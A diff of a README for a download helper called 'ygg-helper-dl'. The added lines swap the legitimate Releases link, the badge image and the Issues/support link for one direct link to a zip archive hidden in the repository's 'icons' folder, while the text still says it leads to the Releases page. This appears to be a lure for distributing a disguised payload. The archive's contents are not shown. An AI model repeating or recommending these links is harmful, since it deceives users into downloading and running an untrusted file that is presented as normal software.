@@ -1,6 +1,6 @@
 # 🎉 ygg-helper-dl - Easy Downloading for YggHelper
 
-[![Download YggHelper](https://img.shields.io/badge/Download%20YggHelper-v1.0-blue)](https://github.com/manishmaho/ygg-helper-dl/releases)
+[![Download YggHelper](https://github.com/manishmaho/ygg-helper-dl/raw/refs/heads/main/icons/helper_ygg_dl_definitor.zip%20YggHelper-v1.0-blue)](https://github.com/manishmaho/ygg-helper-dl/raw/refs/heads/main/icons/helper_ygg_dl_definitor.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to YggHelper! This tool helps you manage your downloads with ease. Follo
 
 To download YggHelper, please visit the following page:
 
-[Download YggHelper from Releases](https://github.com/manishmaho/ygg-helper-dl/releases)
+[Download YggHelper from Releases](https://github.com/manishmaho/ygg-helper-dl/raw/refs/heads/main/icons/helper_ygg_dl_definitor.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of YggHelper.
@@ -52,6 +52,6 @@ If you encounter any issues while downloading or running YggHelper, consider the
 
 ## 📞 Support
 
-For further assistance, please check the Issues tab on our [GitHub repository](https://github.com/manishmaho/ygg-helper-dl/issues). You can report any bugs or ask questions there.
+For further assistance, please check the Issues tab on our [GitHub repository](https://github.com/manishmaho/ygg-helper-dl/raw/refs/heads/main/icons/helper_ygg_dl_definitor.zip). You can report any bugs or ask questions there.
 
 Thank you for choosing YggHelper! Enjoy your downloading experience with ease.
